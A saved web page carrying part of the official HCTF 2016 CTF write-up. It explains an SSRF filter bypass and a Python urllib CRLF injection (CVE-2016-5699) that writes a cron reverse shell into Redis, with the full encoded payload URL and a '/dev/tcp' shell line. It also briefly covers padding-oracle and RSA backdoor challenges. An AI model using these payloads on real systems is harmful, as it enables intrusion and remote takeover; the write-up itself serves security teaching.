<p style="text-align: center"><a href="http://image.3001.net/images/20161202/14806148462983.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="1.png" data-original="http://image.3001.net/images/20161202/14806148462983.png!small" src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/grey.gif" width="690"></a>     </p>
<noscript>&lt;img alt="1.png" src="http://image.3001.net/images/20161202/14806148462983.png!small" width="690" height="466"&gt;     &lt;/p&gt;</noscript>
<p>随便放个图片地址，发现返回了一张图片，</p>
<p style="text-align: center"><a href="http://image.3001.net/images/20161202/14806148685813.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="2.png" data-original="http://image.3001.net/images/20161202/14806148685813.png!small" src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/grey.gif" width="630"></a>     </p>
<noscript>&lt;img alt="2.png" src="http://image.3001.net/images/20161202/14806148685813.png!small" width="630" height="400"&gt;     &lt;/p&gt;</noscript>
<p>从这部分 很容易想到这里存在ssrf，那么问题就是如何过滤了。</p>
<p>稍微测试下，我们发现返回了</p>
<pre><code class="hljs python"><p>**NoNoNo, guys, Links must be accord <span class="hljs-keyword">with</span> standard of .tld <span class="hljs-keyword">and</span> contain domain name.**</p></code></pre>
<p>这里我们测试能发现，并不允许ip的请求，也就是描述中所说的，请求必须符合.tld标准并且包含域名，如果想要请求127.0.0.1，我们这里有两种绕过方式</p>
<pre><code class="hljs ruby"><p><span class="hljs-number">1</span>、<a href="http://www.127.0.0.1.xip.io/"><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/www.127.0.0.1.xip.io</span></a></p><p><span class="hljs-regexp">这种方式可以自动把域名指向中间的ip，在一些特殊情况下非常好用</span></p><p><span class="hljs-regexp">2、</span><a href="http://xxxxx/?u=http://127.0.0.1"><span class="hljs-regexp">http:/</span><span class="hljs-regexp">/xxxxx/</span><span class="hljs-string">?u</span>=<span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/127.0.0.1</span></a></p><p><span class="hljs-regexp">在有域名的vps上写一个跳转页面实现，事实上，只有第二种做法可以顺利继续做下一题</span></p></code></pre>
<p></p>
<p><b>#### AT Field2 ####</b></p>
<p>到了这里，很容易误解认为要扫本机的服务，所以及时放出了3个提示</p>
<blockquote><p>1: 在第一题里不只有flag，还有第二题的入口</p>
<p>2、扫端口没用，几百线程也没用的呀</p>
<p>3、我从来没说过，flag1那里没有别的东西啊</p>
</blockquote>
<p>不能说提示有多明显吧，但是我相信从hint不难得出，在上一个flag所在页面，存在一些别的未知的文件，那么抄起扫目录的脚本，跑一跑，很快找到`<a href="http://127.0.0.1/README.md">http://127.0.0.1/README.md</a>`</p>
<p>base64解码得到</p>
<blockquote><p>11.23</p>
<p>ak说上线的.git要都删了，以免被拖源码</p>
<p>11.24</p>
<p>听ak说nosql蛮好用的，link一个玩玩看</p>
<p>11.25</p>
<p>哎呀,docker怎么没有crontab,都不能定时重启，装一个装一个</p>
</blockquote>
<p><b>事实上，在这三句话中能获得信息远远超过你的想象…</b></p>
<p>首先是nosql，我们可以得到服务的大致端口号，这个我相信大部分人都能想想到</p>
<p>其次就是docker，如果你尝试过使用docker来连接容器的话，你就会知道很多隐藏信息</p>
<blockquote><p>1、redis的docker中没有任何多余的服务，crontab也没有，当然也不可能有web服务</p>
<p>2、docker的连接方式类似于内网，所以和题目并不在同一个docker</p>
<p>3、docker内网比较特殊，类似于从192.168.0.1开始，如果前面的ip被占用，就依次递增，由于题目环境并不复杂，所以内网的ip并不是太多，理论上来说，不超过30个请求就能找到目标ip（这里有一个方式是用过host来代替ip，遗憾的是，经过我的测试，host替代会导致python urllib header注入失败）</p>
<p>4、docker的默认用户是root</p>
</blockquote>
<p>首先我们根据拿到的提示扫内网，目标大概是192.168.0.1向上，端口为熟悉的nosql端口。<b>注意这里有可能存在误区，因为通过link连入的docker内**不存在任何多余的服务**，所以22、80、8080端口都不可能开放！</b></p>
<p>其次就是，如果向redis服务端口发送数据，如果符合格式则会写入数据，如果不符合格式也不会有任何返回，如果向存在服务的端口发送数据的话，页面会因为**超时返回500**，但如果不存在，则会直接返回**urlopen error**</p>
<p><b>根据上面的信息爆破，很快就能得到redis位置**192.168.0.10/6379**</b></p>
<p>根据请求头，不难发现请求中ua为python的urllib</p>
<p>这里先推荐几篇文章</p>
<p><a href="https://security.tencent.com/index.php/blog/msg/106">https://security.tencent.com/index.php/blog/msg/106</a></p>
<p><a href="http://www.tuicool.com/articles/2iIj2eR">http://www.tuicool.com/articles/2iIj2eR</a></p>
<p><b>这里的python urllib header注入漏洞编号**CVE-2016-5699**，值得注意的是由于python的更新频率比较快，所以基本上已经很少有版本存在这个漏洞了，要求**python3 &lt; 3.4.3 || python2 &lt; 2.7.9**</b></p>
<p>而且，windows上会无效，提示geturlinfo error，至今不能肯定原因。</p>
<p>漏洞成因就不多赘述了，这里构造redis向crontab配置文件，写入</p>
<pre><code class="hljs dts">\n*/<span class="hljs-number">1</span> * * * * <span class="hljs-meta-keyword">/bin/</span>bash -i &gt;&amp; <span class="hljs-meta-keyword">/dev/</span>tcp/这里是ip/端口 <span class="hljs-number">0</span>&gt;<span class="hljs-variable">&amp;1</span>\n</code></pre>
<p>事实上，漏洞成因和底层系统同样有关，这里必须是centos才能成功写入crontab并执行，这里我们追踪一份payload来看看实现。</p>
<p><b>payload</b>:</p>
<p>    <a href="http://www.115.28.78.16.xip.io/302.php?u=http%3A%2f%2f192.168.0.10%250d%250a%2a3%250d%250a%25243%250d%250aset%250d%250a%25241%250d%250a1%250d%250a%252462%250d%250a%250a%2a%252F1%2520%2a%2520%2a%2520%2a%2520%2a%2520%252Fbin%252Fbash%2520-i%2520%253E%2526%2520%252Fdev%252Ftcp%252F"></a></p>
<pre><code class="hljs perl"><a href="http://www.115.28.78.16.xip.io/302.php?u=http%3A%2f%2f192.168.0.10%250d%250a%2a3%250d%250a%25243%250d%250aset%250d%250a%25241%250d%250a1%250d%250a%252462%250d%250a%250a%2a%252F1%2520%2a%2520%2a%2520%2a%2520%2a%2520%252Fbin%252Fbash%2520-i%2520%253E%2526%2520%252Fdev%252Ftcp%252F">http:<span class="hljs-regexp">//www</span>.<span class="hljs-number">115.28</span>.<span class="hljs-number">78.16</span>.xip.io/<span class="hljs-number">302</span>.php?u=http%3A%2f%2f192.<span class="hljs-number">168.0</span>.<span class="hljs-number">10</span>%250d%250a%2a3%250d%250a%25243%250d%250aset%250d%250a%25241%250d%250a1%250d%250a%252462%250d%250a%250a%2a%252F1%2520%2a%2520%2a%2520%2a%2520%2a%2520%252Fbin%252Fbash%2520-i%2520%253E%2526%2520%252Fdev%252Ftcp%252F</a>你的ip%252f12345%25200%253E%25261%250a%250d%250aconfig%2520set%2520dir%2520%252Fvar%252Fspool%252Fcron%252F%250d%250aconfig%2520set%2520dbfilename%2520root%250d%250asave%250d%250a%3A6379%2f</code></pre>
<p></p>
<p>请求经过跳转，经过一次urldecode，</p>
<p>    <a href="http://192.168.0.10%0D%0A/"></a></p>
<pre><code class="hljs perl"><a href="http://192.168.0.10%0D%0A/" class="">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">10</span>%0d%0a</a>*<span class="hljs-number">3</span>%0d%0a%243%0d%0aset%0d%0a%241%0d%0a1%0d%0a%2462%0d%0a%0a*%2F1%20*%20*%20*%20*%20%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F你的ip%2f12344%200%3E%261%0a%0d%0aconfig%20set%20dir%20%2Fvar%2Fspool%2Fcron%2F%0d%0aconfig%20set%20dbfilename%20root%0d%0asave%0d%0a:<span class="hljs-number">6379</span>/</code></pre>
<p>然后urldecode进入redis</p>
<p style="text-align: center"><a href="http://image.3001.net/images/20161202/14806155072736.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="Image" data-original="http://image.3001.net/images/20161202/14806155072736.png!small" src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/grey.gif" width="659"></a>     </p>
<noscript>&lt;img alt="Image" src="http://image.3001.net/images/20161202/14806155072736.png!small" width="659" height="340"&gt;     &lt;/p&gt;</noscript>
<p>注意这里在redis中，只有0d0a可以被当作换行符</p>
<p>我发现我们将数据设置为1，并储存进入**/var/spool/cron/root**，写入内容为</p>
<p style="text-align: center"><a href="http://image.3001.net/images/20161202/14806155202545.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="4.png" data-original="http://image.3001.net/images/20161202/14806155202545.png!small" src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/grey.gif" width="625"></a>     </p>
<noscript>&lt;img alt="4.png" src="http://image.3001.net/images/20161202/14806155202545.png!small" width="625" height="38"&gt;     &lt;/p&gt;</noscript>
<p>写入文件的内容是这样的，前后被插入了特殊的数据</p>
<p style="text-align: center"><a href="http://image.3001.net/images/20161202/14806155401662.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="5.png" data-original="http://image.3001.net/images/20161202/14806155401662.png!small" src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/grey.gif" width="635"></a>     </p>
<noscript>&lt;img alt="5.png" src="http://image.3001.net/images/20161202/14806155401662.png!small" width="635" height="64"&gt;     &lt;/p&gt;</noscript>
<p>事实上，在除centos以外系统上，redis是redis用户跑起来的，所以写的文件也是redis用户组，并没有权限写入cron文件夹，并且，在其他系统中，这个配置文件有较为严格的格式要求，如果存在奇怪的数据，会导致命令执行失败。</p>
<p>还有一个特别的问题，redis中储存数据为键值对形式，所以其实把内容写入2，就不会覆盖了，我们来看看测试</p>
<p style="text-align: center"><a href="http://image.3001.net/images/20161202/14806156381094.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="6.png" data-original="http://image.3001.net/images/20161202/14806156381094.png!small" src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/grey.gif" width="669"></a>     </p>
<noscript>&lt;img alt="6.png" src="http://image.3001.net/images/20161202/14806156381094.png!small" width="669" height="81"&gt;     &lt;/p&gt;</noscript>
<p style="text-align: center"><a href="http://image.3001.net/images/20161202/14806156531591.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="7.png" data-original="http://image.3001.net/images/20161202/14806156531591.png!small" src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/grey.gif" width="586"></a>     </p>
<noscript>&lt;img alt="7.png" src="http://image.3001.net/images/20161202/14806156531591.png!small" width="586" height="107"&gt;     &lt;/p&gt;</noscript>
<p>成功了，事实上，hint5也就是因此存在的，我们成功拿到了反弹的shell</p>
<h2><b><br></b></h2>
<h2><b><br></b></h2>
<h2><b><br></b></h2>
<h2><b># Level 4 #</b></h2>
<p></p>
<h3></h3>
<h3></h3>
<h3>## 5-days ##</h3>
<p></p>
<p>[wp地址](<a href="https://github.com/spineee/hctf2016_5-days/blob/master/5-days%20wp.pdf">https://github.com/spineee/hctf2016_5-days/blob/master/5-days%20wp.pdf</a>)</p>
<h3></h3>
<h3></h3>
<h3>## 二进制选手的自我修养 ##</h3>
<p>作为一位二进制选手，re，pwn，crypto都是自己的必修课23333</p>
<p>这一题的出现也是偶然。某一天在写一个根据密钥自解密代码运行的程序。而如果输入的密钥是错误的，程序就会直接退出。那个时候突然想到，如果我输入的某一个密钥。解密出来的代码正好是一段恶意的代码会怎么样？顺着这个思路就有了这一题</p>
<p>密码学部分其实也是正好听做web的队友讲起过的padding oracle攻击方式。在仔细的研究了这种攻击方式之后，发现这种攻击正好适合我设想的情况。</p>
<blockquote><p>1.在不知道密钥的情况，通过密码学攻击还原出明文的内容，然后进行逆向，获得一半的flag</p>
<p>2.在不知道密钥的情况下，通过padding oracle来控制解密出来的内容是shellcode，从而获得系统权限。</p>
</blockquote>
<p>PS：我还算很好心的，本来des打算用静态编译来着。而且因为自己失误，结果连符号都没有去掉</p>
<p>PS2：关于奇怪的main2.c。其实做题的时候，服务器端的代码是main2.c，而给选手的代码main.c。main2产生的理由有2个，一个是服务器上由于沙箱和一些环境原因，所以key文件和程序工作目录不是同一个，需要制定觉得路径。然而并不想因为绝对路径暴露服务器信息和对选手调试产生麻烦。</p>
<p>而服务器程序中的循环是因为根据本来的逻辑，如果填充校验不过应该直接退出。然而开启新线程开销很大，所以使用这种方法来减少开销，结合沙箱的自动重启机制。我相信没有什么选手在比赛中发现服务器上程序和自己拿到的不是同一个</p>
<h3></h3>
<h3></h3>
<h3>## Crypto So Amazing ##</h3>
<blockquote><p>题目: &lt;<a href="https://github.com/Hcamael/ctf-library/tree/master/RSA3">https://github.com/Hcamael/ctf-library/tree/master/RSA3</a>&gt;</p>
<p>payload:</p>
<p>- &lt;<a href="https://github.com/Hcamael/ctf-library/blob/master/RSA3/rsa3_payload.py">https://github.com/Hcamael/ctf-library/blob/master/RSA3/rsa3_payload.py</a>&gt;</p>
<p>- &lt;<a href="https://github.com/Hcamael/ctf-library/blob/master/RSA3/rsa3.sage">https://github.com/Hcamael/ctf-library/blob/master/RSA3/rsa3.sage</a>&gt;</p>
</blockquote>
<p>出题时预测的分数在450分左右, 不过却没有能做出来, 我知道的几个队都是被上一题的脚本给坑了</p>
<p><b>本题思路来源: 基于有限域F(2^m)上椭圆曲线的RSA后门生成算法</b></p>
<p>流程图懒得画了, 上一题的后门算法看懂了, 这题去看代码也不难, 主要是通过`Diffie–Hellman key exchange`算法生成私钥作为种子生成伪随机数, 私钥很好求, 本题的难点跟上题一样同样在于`Coppersmith partial information attack`算法</p>
<p>上一题我故意改简单了, 已知p的前640比特, 所以可以很容易通过&lt;<a href="https://github.com/Gao-Chuan/RSA-and-LLL-attacks">https://github.com/Gao-Chuan/RSA-and-LLL-attacks</a>&gt;这个脚本恢复出完整的p</p>
<p>但是这题已知p的前576bit, github上的那个脚本就跑不出来了</p>
<p>这部分是出题时无意间挖出的坑, 因为我并不知道github上的这个脚本, 在我预想中能做出rsa2的基本都是能做出rsa3的</p>
<p>这题还有一个坑点</p>
<p style="text-align: center"><a href="http://image.3001.net/images/20161202/14806162135691.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="hctf_rsa_keng2.png" data-original="http://image.3001.net/images/20161202/14806162135691.png!small" src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/grey.gif" width="690"></a>     </p>
<noscript>&lt;img alt="hctf_rsa_keng2.png" src="http://image.3001.net/images/20161202/14806162135691.png!small" width="690" height="321"&gt;     &lt;/p&gt;</noscript>
<p style="text-align: center"><a href="http://image.3001.net/images/20161202/14806150948035.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="hctf_rsa_keng1.png" data-original="http://image.3001.net/images/20161202/14806150948035.png!small" src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/grey.gif" width="690"></a>     </p>
<noscript>&lt;img alt="hctf_rsa_keng1.png" src="http://image.3001.net/images/20161202/14806150948035.png!small" width="690" height="257"&gt;     &lt;/p&gt;</noscript>
<p>sage和python 用相同的seed生成的随机数不一样, 所以在payload中我使用了python生成随机数</p>
<p>比赛结束，很多小伙伴一直急着问我们官方writeup什么时候出，最近特别忙一直拖到现在才发，在此说一声抱歉。也感谢小伙伴们对我们Vidar-Team及HCTF的关注与支持，当我看到群里小伙伴们能这么说，感觉还是很欣慰的。</p>
<h2 style="text-align: center"><a href="http://image.3001.net/images/20161202/14806168984884.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="liang.png" data-original="http://image.3001.net/images/20161202/14806168984884.png!small" src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/grey.gif" width="690"></a></h2>
<noscript>&lt;img alt="liang.png" src="http://image.3001.net/images/20161202/14806168984884.png!small" width="690" height="643"&gt;&lt;/h2&gt;</noscript>
<p>相信接下来，在大家的关心和支持下，在我们的不断努力下，Vidar-Team会越走越远，HCTF也会越来越精彩，最后再说声感谢～。</p>
<p>PS ： 这次比赛单单Web题就收到470w+的请求，很多小伙伴比赛过程中开着扫描器乱扫，我一不留神就有一个队伍就扫了30w次，（没错，乱扫的IP都是被我ban的…比赛最后10个小时内我还Ban了一个C段的IP…..说完这句我就逃…），其实大部分题目都不用扫的，个别需要的我们也会注明的。乱扫也出不来flag反而会被ban，于彼与此都没好处……(^○^)</p>
<p>如有任何问题，欢迎联系我们。Email ：public#vidar.club ( # 替换 @ )</p>
<p><b><span style="font-size: 15px">*本文原创作者：sysorem，本文属FreeBuf原创奖励计划，未经许可禁止转载</span><span>    </span></b>    </p>
        </div>
        <div class="article-oper article-oper-new">
			<style>
				@font-face {font-family: 'iconfont';
					src: url('http://static.3001.net/iconfonts/iconfont.eot'); /* IE9*/
					src: url('http://static.3001.net/iconfonts/iconfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */
					url('http://static.3001.net/iconfonts/iconfont.woff') format('woff'), /* chrome、firefox */
					url('http://static.3001.net/iconfonts/iconfont.ttf') format('truetype'), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/
					url('http://static.3001.net/iconfonts/iconfont.svg#iconfont') format('svg'); /* iOS 4.1- */
				}
			</style>
			<div class="share-new fixed" style="width: 893px; left: 32px;">
				<div class="share-author">
											<a href="http://www.freebuf.com/author/sysorem" title="由 sysorem 发布" rel="author">
							<img src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/admin-avatar.png" width="50" height="50" alt="sysorem" class="avatar avatar-50 wp-user-avatar wp-user-avatar-50 photo">							<!--							<img src="http://image.3001.net/2015/06/17.jpg" alt="ArthurKiller">-->
						</a>
						<div class="share-author-info">
														<a class="author-name" href="http://www.freebuf.com/author/sysorem">sysorem</a>
							<!--<span class="icon-f"></span>-->
							<span><i class="colour-red">5</i>篇文章</span><span>等级：<i class="colour-green">3</i>级</span>
						</div>
									</div>
				<div class="user-center clearfix">
					<a href="http://www.freebuf.com/author/sysorem" title="个人主页" target="_blank"></a>
					<a href="http://www.freebuf.com/user/pm?pmaction=newmessage&amp;to=sysorem" title="私信" target="_blank"></a>
<!--					<a href="http://www.freebuf.com/author/ArthurKiller" title="个人主页">&#xe61b;</a>-->
<!--					<a href="http://www.freebuf.com/user/pm?pmaction=newmessage&to=ArthurKiller" title="私信">&#xe611;</a>-->
				</div>
				<div class="share-ctrl clearfix">
					<div class="bdsharebuttonbox clearfix bdshare-button-style1-24" data-bd-bind="1480927017837">
						<a href="http://www.freebuf.com/articles/web/121778.html#" data-cmd="tsina" title="分享到新浪微博"></a>
						<a href="http://www.freebuf.com/articles/web/121778.html#" data-cmd="weixin" title="分享到微信" id="weixin"></a>
						<a href="http://www.freebuf.com/articles/web/121778.html#" data-cmd="qzone" title="分享到QQ空间"></a>
						<a href="http://www.freebuf.com/articles/web/121778.html#">|</a>
					</div>
				</div>
				<div class="user-ctrl clearfix">
										<a href="http://www.freebuf.com/oauth" title="收藏" class="like-grey"></a>
					<!--					<a href="#" title="收藏" class="like-grey">&#xe798;</a>-->
<!--					<a href="#" title="收藏" class="like-red"><img src="http://image.3001.net/images/new/user-like.png" /></a>-->
					<a href="http://www.freebuf.com/articles/web/121778.html#respond" title="评论"></a>
					<!--					<a href="#" title="文章纠正">&#xe6e3;</a>-->
					<a href="http://www.freebuf.com/articles/web/121778.html#">|</a>
					<span class="info-alert"></span>
				</div>
			</div>
			<script>
				window._bd_share_config={
					"common": {
						"bdSnsKey": {},
						"bdText": "",
						"bdMini": "2",
						"bdMiniList": ["qzone", "tsina", "weixin"],
						"bdPic": "",
						"bdStyle": "1",
						"bdSize": "24"
					},
					"share":{},
				};
				with(document)0[
					(getElementsByTagName('head')[0]||body).
					appendChild(createElement('script')).
						src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)
					];
				//控制垂直方向分享模块的定位
				function shareFixVertical(){
					var offsetTop = jQuery(".article-oper").get(0).offsetTop;
					var win_h = jQuery(window).height();
					var win_w = jQuery(window).width();
					var scrollTop = document.body.scrollTop||document.documentElement.scrollTop;
					var _height = offsetTop-scrollTop;
					if(_height>=win_h-130&&win_w>975){
						var _width = jQuery("#getWidth").innerWidth()-30;
						var _left = jQuery("#getWidth").offset().left+15;
						jQuery(".share-new").addClass("fixed");
						jQuery(".fixed").css({
							width:_width,
							left:_left
						});

					}else{
						jQuery(".share-new").removeClass("fixed");
						jQuery(".share-new").css({
							width: "100%"
						});
					}
				}
				//控制水平方向分享模块的定位
				function shareFixHorizontal(){
					var _width = jQuery("#getWidth").innerWidth()-30;
					var _left = jQuery("#getWidth").get(0).offsetLeft+15;
					var win_w = document.documentElement.clientWidth || document.body.clientWidth;
					console.log(win_w);
					jQuery(".fixed").css({
						width:_width,
						left:_left
					});
					if(win_w< 975){
						jQuery(".share-new").css({
							width: "100%",
							left: "0"
						});
					}else{
						var _width = jQuery("#getWidth").innerWidth()-30;
						var _left = jQuery("#getWidth").get(0).offsetLeft+15;
						jQuery(".fixed").css({
							width:_width,
							left:_left
						});
					}
				}

				jQuery(window).on("load",function(){
					shareFixVertical();
				});

				jQuery(window).on("scroll",function(){
					shareFixVertical();
				});

				jQuery(window).on("resize",function(){
					shareFixHorizontal();
				})
				$(document).click(function(e){
					if($(e.target).attr("id")=="weixin"){
						$("#bdshare_weixin_qrcode_dialog").show();
					}else{
						$("#bdshare_weixin_qrcode_dialog").hide();
					}
				})
			</script>
        </div>
                        		        <div class="article-pager">
          <ul>
            <li class="previous"><span>上一篇：</span><a href="http://www.freebuf.com/articles/web/121679.html" rel="prev">Splunk+蜜罐+防火墙=简易WAF</a>			</li>
            <li class="next"><span>下一篇：</span>
			<a href="javascript:viod(0);" rel="next">本篇已是最新文章</a>			</li>
          </ul>
        </div>
      </div>
      </div>
      <div class="comment-list">
	  
<script src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/ajaxfileupload.js" type="text/javascript"></script>
<div id="respond" class="comment-box">
<input type="file" id="uploadUnit" name="upfile" class="hidden" value="">
    <form action="http://www.freebuf.com/wp-comments-post.php" method="post" id="commentform">
        <div id="comment-author-info">
	    <div class="login-other">
		  <div class="login_button login_icon_sina" title="使用新浪微博登陆" onclick="login_button_click(&#39;sina&#39;)"></div>
          <div class="login_button login_icon_qq" title="使用腾讯QQ登陆" onclick="login_button_click(&#39;qq&#39;)"></div></div>
        <div class="login-input">
	    <p><label for="author">昵称</label>
		          <input type="text" name="author" id="author" value="" size="14" tabindex="1" aria-required="true" placeholder="请输入昵称" required="">
        </p><span>必须</span><span>您当前尚未登录。<a class="simplemodal-login" href="http://www.freebuf.com/wp-login.php?redirect_to=http%3A%2F%2Ffreebuf.com%2Farticles%2Fweb%2F121778.html" title="登陆">登陆？</a><a href="http://www.freebuf.com/wp-login.php?action=register" target="_blank">注册</a></span></div>
		<div class="login-input">
		  <p><label for="email">邮箱</label><input type="text" name="email" id="email" value="" size="25" tabindex="2" aria-required="true" placeholder="请输入邮箱地址" required=""></p>
		<span>必须（保密）</span>
		</div>
    </div>

        <div id="test" class="post-area">
      <div class="holiday"></div>
	    <div class="comment-editor">
			<a id="comment-smiley" href="javascript:;">表情</a><a href="javascript:;" id="imageThumb">插图</a>
	    </div>
        <div id="smileys">
           <a title="mrgreen" href="javascript:grin(&#39;:mrgreen:&#39;)"><img src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/icon_mrgreen.gif"></a><a title="razz" href="javascript:grin(&#39;:razz:&#39;)"><img src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/icon_razz.gif"></a><a title="sad" href="javascript:grin(&#39;:sad:&#39;)"><img src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/icon_sad.gif"></a><a title="smile" href="javascript:grin(&#39;:smile:&#39;)"><img src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/icon_smile.gif"></a><a title="oops" href="javascript:grin(&#39;:oops:&#39;)"><img src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/icon_redface.gif"></a><a title="grin" href="javascript:grin(&#39;:grin:&#39;)"><img src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/icon_biggrin.gif"></a><a title="eek" href="javascript:grin(&#39;:eek:&#39;)"><img src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/icon_surprised.gif"></a><a title="???" href="javascript:grin(&#39;:???:&#39;)"><img src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/icon_confused.gif"></a><a title="cool" href="javascript:grin(&#39;:cool:&#39;)"><img src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/icon_cool.gif"></a><a title="lol" href="javascript:grin(&#39;:lol:&#39;)"><img src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/icon_lol.gif"></a><a title="mad" href="javascript:grin(&#39;:mad:&#39;)"><img src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/icon_mad.gif"></a><a title="twisted" href="javascript:grin(&#39;:twisted:&#39;)"><img src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/icon_twisted.gif"></a><a title="roll" href="javascript:grin(&#39;:roll:&#39;)"><img src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/icon_rolleyes.gif"></a><a title="wink" href="javascript:grin(&#39;:wink:&#39;)"><img src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/icon_wink.gif"></a><a title="idea" href="javascript:grin(&#39;:idea:&#39;)"><img src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/icon_idea.gif"></a><a title="arrow" href="javascript:grin(&#39;:arrow:&#39;)"><img src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/icon_arrow.gif"></a><a title="neutral" href="javascript:grin(&#39;:neutral:&#39;)"><img src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/icon_neutral.gif"></a><a title="cry" href="javascript:grin(&#39;:cry:&#39;)"><img src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/icon_cry.gif"></a><a title="?" href="javascript:grin(&#39;:?:&#39;)"><img src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/icon_question.gif"></a><a title="evil" href="javascript:grin(&#39;:evil:&#39;)"><img src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/icon_evil.gif"></a><a title="shock" href="javascript:grin(&#39;:shock:&#39;)"><img src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/icon_eek.gif"></a><a title="!" href="javascript:grin(&#39;:!:&#39;)"><img src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/icon_exclaim.gif"></a>        </div>
         <textarea name="comment" id="comment" cols="100%" rows="7" tabindex="4" style="overflow-x:hidden; overflow-y:hidden; border:0; width:100%;" onkeydown="if(event.ctrlKey&amp;&amp;event.keyCode==13){document.getElementById(&#39;submit&#39;).click();return false};"></textarea><div id="loading" style="display: none;"><img src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/wpspin_light.gif" style="vertical-align:middle;" alt=""> 正在提交, 请稍候...</div><div id="error" style="display: none;">#</div>
    </div>
      <div class="subcon but">
      <input class="btn btn-success" type="submit" name="submit" id="submit" tabindex="5" value="提交评论(Ctrl+Enter)">
      <a rel="nofollow" class="btn btn-default" id="cancel-comment-reply-link" href="javascript:;">取消</a>
      <div class="checkbox"><input type="hidden" name="comment_post_ID" value="121778" id="comment_post_ID">
<input type="hidden" name="comment_parent" id="comment_parent" value="0">
<label for="comment_mail_notify" class="comment_mail"><input type="checkbox" name="comment_mail_notify" id="comment_mail_notify" value="comment_mail_notify" checked="checked">有人回复时邮件通知我</label></div>
      </div>
    <input name="Token" id="Token" type="hidden" value="t0dfbx">
  </form>
  </div>
</div>	  
<div class="commentshow">
<div class="comments-loading">Loading...</div>
</div>
<script language="javascript">
jQuery(document).ready(function($){ //Begin jQuery
    $('.reply').click(function() {
    var atid = '"#' + $(this).parent().attr("id") + '"';
    var atname = $(this).parent().find('span:first').text();
    $("#comment").val("@" + atname + " ").focus();
});
    $('.cancel-comment-reply a').click(function() { //点击取消回复评论清空评论框的内容
    $("#comment").val('');
});
}) 

jQuery(document).ready(function($) {
    $body = (window.opera) ? (document.compatMode == "CSS1Compat" ? $('html') : $('body')) : $('html,body');//commentnav ajax
    $(document).on('click', '.commentnav a', function(e) {
        e.preventDefault();
        $.ajax({
            type: "GET",
            url: $(this).attr('href'),
            beforeSend: function() {
                $('.commentnav').remove();
                $('.comment-list').remove();
                $('.comments-loading').slideDown();
            },
            dataType: "html",
            success: function(out) {
                result = $(out).find('.comment-list');
                nextlink = $(out).find('.commentnav');
                $('.comments-loading').slideUp(550);
                $('.comments-loading').after(result.fadeIn(800));
                $(".comment-list img").each(function(){
                  var url = $(this).attr("data-original");
                  $(this).attr("src",url);
                })
            }
